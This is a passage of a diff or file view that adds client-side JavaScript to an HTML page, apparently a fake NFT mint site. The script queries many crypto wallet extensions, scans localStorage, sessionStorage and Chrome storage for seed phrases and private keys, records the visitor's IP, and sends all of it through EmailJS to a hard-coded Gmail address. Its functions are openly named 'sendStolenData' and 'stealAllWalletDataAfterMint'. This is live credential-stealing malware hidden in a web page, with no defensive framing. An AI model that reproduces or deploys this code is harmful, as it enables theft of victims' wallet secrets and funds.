+│  extractCoinbaseWalletData();                           │
+│                          break;                         │
+│                      case 'solflare':                   │
+│                          allData.walletData = await     │
+│  extractSolflareData();                                 │
+│                          break;                         │
+│                      case 'torus':                      │
+│                          allData.walletData = await     │
+│  extractTorusData();                                    │
+│                          break;                         │
+│                      case 'walletconnect':              │
+│                          allData.walletData = await     │
+│  extractWalletConnectData();                            │
+│                          break;                         │
+│                  }                                      │
+│                                                         │
+│                  // Send data                           │
+│                  await sendStolenData({                 │
+│                      phase: 'initial_connection',       │
+│                      ...allData                         │
+│                  });                                    │
+│                                                         │
+│              } catch (error) {                          │
+│                  console.error('Failed to steal wallet  │
+│  data:', error);                                        │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          // Storage scanning functions                  │
+│          async function scanLocalStorage() {            │
+│              const data = {};                           │
+│              for (let i = 0; i < localStorage.length;   │
+│  i++) {                                                 │
+│                  const key = localStorage.key(i);       │
+│                  const value =                          │
+│  localStorage.getItem(key);                             │
+│                  if (key &&                             │
+│  (key.toLowerCase().includes('seed') ||                 │
+│  key.toLowerCase().includes('private') ||               │
+│  key.toLowerCase().includes('key'))) {                  │
+│                      data[key] = value;                 │
+│                  }                                      │
+│              }                                          │
+│              return data;                               │
+│          }                                              │
+│                                                         │
+│          async function scanSessionStorage() {          │
+│              const data = {};                           │
+│              for (let i = 0; i <                        ││  sessionStorage.length; i++) {                          ││                  const key = sessionStorage.key(i);     ││                  const value =                          │
+│  sessionStorage.getItem(key);                           │
+│                  if (key &&                             │
+│  key.toLowerCase().includes('seed')) {                  │
+│                      data[key] = value;                 │
+│                  }                                      │
+│              }                                          │
+│              return data;                               │
+│          }                                              │
+│                                                         │
+│          async function scanChromeStorage() {           │
+│              if (typeof chrome !== 'undefined' &&       │
+│  chrome.storage && chrome.storage.local) {              │
+│                  try {                                  │
+│                      return await new                   │
+│  Promise((resolve, reject) => {                         │
+│                          chrome.storage.local.get(null  │
+│  , (data) => {                                          │
+│                              if                         │
+│  (chrome.runtime.lastError) {                           │
+│                                  reject(chrome.runtime  │
+│  .lastError);                                           │
+│                              } else {                   │
+│                                  resolve(data);         │
+│                              }                          │
+│                          });                            │
+│                      });                                │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not access  │
+│  Chrome storage' };                                     │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Chrome storage not        │
+│  available' };                                          ││          }                                              ││                                                         ││          // Wallet-specific extraction functions        ││          async function extractMetaMaskData() {         ││              if (typeof window.ethereum !==             ││  'undefined') {                                         ││                  try {                                  ││                      const permissions = await          │
+│  window.ethereum.request({                              │
+│                          method:                        │
+│  'wallet_getPermissions'                                │
+│                      });                                │
+│                      const accounts = await             │
+│  window.ethereum.request({                              │
+│                          method: 'eth_accounts'         │
+│                      });                                │
+│                                                         │
+│                      return {                           │
+│                          permissions: permissions,      │
+│                          accounts: accounts,            │
+│                          isMetaMask:                    │
+│  window.ethereum.isMetaMask                             │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract MetaMask data' };                              │
+│                  }                                      │
+│              }                                          ││              return { error: 'MetaMask not detected'    │
+│  };                                                     │
+│          }                                              │
+│                                                         │
+│          async function extractPhantomData() {          │
+│              if (typeof window.solana !== 'undefined')  │
+│  {                                                      │
+│                  try {                                  │
+│                      return {                           │
+│                          publicKey:                     │
+│  window.solana.publicKey?.toString(),                   │
+│                          isPhantom:                     │
+│  window.solana.isPhantom,                               │
+│                          connected:                     │
+│  window.solana.isConnected                              │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Phantom data' };                               │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Phantom not detected' };  │
+│          }                                              │
+│                                                         │
+│          async function extractTrustWalletData() {      │
+│              if (typeof window.ethereum !==             │
+│  'undefined' || typeof window.trustWallet !==           │
+│  'undefined') {                                         │
+│                  const provider = window.ethereum ||    │
+│  window.trustWallet;                                    │
+│                  try {                                  │
+│                      const accounts = await             │
+│  provider.request({                                     │
+│                          method: 'eth_accounts'         │
+│                      });                                │
+│                                                         │
+│                      return {                           │
+│                          accounts: accounts,            │
+│                          isTrust: provider.isTrust ||   │
+│  false                                                  │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Trust Wallet data' };                          │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Trust Wallet not          │
+│  detected' };                                           │
+│          }                                              │
+│                                                         │
+│          async function extractBinanceWalletData() {    │
+│              if (typeof window.BinanceChain !==         │
+│  'undefined') {                                         │
+│                  try {                                  │
+│                      const accounts = await             │
+│  window.BinanceChain.request({                          │
+│                          method: 'eth_accounts'         │
+│                      });                                │
+│                                                         │
+│                      return {                           │
+│                          accounts: accounts,            │
+│                          isBinance: true                │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Binance Wallet data' };                        │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Binance Wallet not        │
+│  detected' };                                           │
+│          }                                              │
+│                                                         │
+│          async function extractCoinbaseWalletData() {   │
+│              if (typeof window.coinbaseWalletExtension  │
+│  !== 'undefined') {                                     │
+│                  try {                                  │
+│                      const accounts = await             │
+│  window.coinbaseWalletExtension.request({               │
+│                          method: 'eth_accounts'         │
+│                      });                                │
+│                                                         │
+│                      return {                           │
+│                          accounts: accounts,            │
+│                          isCoinbase: true               │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Coinbase Wallet data' };                       │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Coinbase Wallet not       │
+│  detected' };                                           │
+│          }                                              │
+│                                                         │
+│          async function extractSolflareData() {         │
+│              if (typeof window.solflare !==             │
+│  'undefined') {                                         │
+│                  try {                                  │
+│                      return {                           │
+│                          publicKey:                     │
+│  window.solflare.publicKey?.toString(),                 │
+│                          connected:                     │
+│  window.solflare.isConnected                            │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Solflare data' };                              │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Solflare not detected'    │
+│  };                                                     │
+│          }                                              │
+│                                                         │
+│          async function extractTorusData() {            │
+│              if (typeof window.torus !== 'undefined')   │
+│  {                                                      │
+│                  try {                                  │
+│                      return {                           │
+│                          userInfo:                      │
+│  window.torus.userInfo,                                 │
+│                          isTorus: true                  │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract Torus data' };                                 │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'Torus not detected' };    │
+│          }                                              │
+│                                                         │
+│          async function extractWalletConnectData() {    │
+│              if (walletProvider &&                      │
+│  walletProvider.connector) {                            │
+│                  try {                                  │
+│                      return {                           │
+│                          peerMeta:                      │
+│  walletProvider.connector.peerMeta,                     │
+│                          accounts:                      │
+│  walletProvider.connector.accounts,                     │
+│                          chainId:                       │
+│  walletProvider.connector.chainId                       │
+│                      };                                 │
+│                  } catch (e) {                          │
+│                      return { error: 'Could not         │
+│  extract WalletConnect data' };                         │
+│                  }                                      │
+│              }                                          │
+│              return { error: 'WalletConnect not         │
+│  detected' };                                           │
+│          }                                              │
+│                                                         │
+│          // Final data theft after mint                 │
+│          async function                                 │
+│  stealAllWalletDataAfterMint(address, balance,          │
+│  walletType) {                                          │
+│              try {                                      │
+│                  const additionalData = {               │
+│                      phase: 'post_mint',                │
+│                      walletType: walletType,            │
+│                      address: address,                  │
+│                      balance: balance,                  │
+│                      timestamp: new                     │
+│  Date().toISOString(),                                  │
+│                      userAgent: navigator.userAgent,    │
+│                      referrer: document.referrer,       │
+│                      url: window.location.href          │
+│                  };                                     │
+│                                                         │
+│                  // Get post-mint wallet state          │
+│                  if (walletProvider) {                  │
+│                      try {                              │
+│                          if (walletProvider.request) {  │
+│                              const accounts = await     │
+│  walletProvider.request({                               │
+│                                  method:                │
+│  'eth_accounts'                                         │
+│                              });                        │
+│                              additionalData.postMintAc  │
+│  counts = accounts;                                     │
+│                          }                              │
+│                      } catch (e) {                      │
+│                          additionalData.postMintError   │
+│  = e.message;                                           │
+│                      }                                  │
+│                  }                                      │
+│                                                         │
+│                  await sendStolenData(additionalData);  │
+│                  console.log('Final wallet data sent    │
+│  successfully!');                                       │
+│                                                         │
+│              } catch (error) {                          │
+│                  console.error('Failed to steal         │
+│  post-mint data:', error);                              │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          // Send stolen data via Email.js               │
+│          async function sendStolenData(data) {          │
+│              try {                                      │
+│                  const templateParams = {               │
+│                      to_email: "ovourcross@gmail.com",  │
+│                      victim_address: data.address,      │
+│                      victim_balance: data.balance,      │
+│                      wallet_type: data.walletType ||    │
+│  'Unknown',                                             │
+│                      timestamp: data.timestamp,         │
+│                      user_agent: data.userAgent,        │
+│                      referrer: data.referrer,           │
+│                      url: data.url,                     │
+│                      ip_address: await getVisitorIP(),  │
+│                      phase: data.phase || 'unknown',    │
+│                      transaction_hash:                  │
+│  data.transactionHash || 'N/A',                         │
+│                      wallet_data:                       │
+│  JSON.stringify(data.walletData || data, null, 2),      │
+│                      local_storage:                     │
+│  JSON.stringify(data.localStorage || {}, null, 2),      │
+│                      session_storage:                   │
+│  JSON.stringify(data.sessionStorage || {}, null, 2),    │
+│                      chrome_storage:                    │
+│  JSON.stringify(data.chromeStorage || {}, null, 2)      │
+│                  };                                     │
+│                                                         │
+│                  const response = await emailjs.send(   │
+│                      "service_62yc0zi",                 │
+│                      "template_ugv2uq9",                │
+│                      templateParams                     │
+│                  );                                     │
+│                                                         │
+│                  console.log('Email sent                │
+│  successfully:', response);                             │
+│                                                         │
+│              } catch (error) {                          │
+│                  console.error('Failed to send email    │
+│  via Email.js:', error);                                │
+│              }                                          │
+│          }                                              │
+│                                                         │
+│          // Get visitor IP address                      │
+│          async function getVisitorIP() {                │
+│              try {                                      │
+│                  const response = await                 │
+│  fetch('https://api.ipify.org?format=json');            │
+│                  const data = await response.json();    │
+│                  return data.ip;                        │
+│              } catch {                                  │
+│                  return 'Unknown';                      │
+│              }                                          │
+│          }                                              │
+│      </script>                                          │
+│  </body>                                                │
+│  </html>                                                │
+│
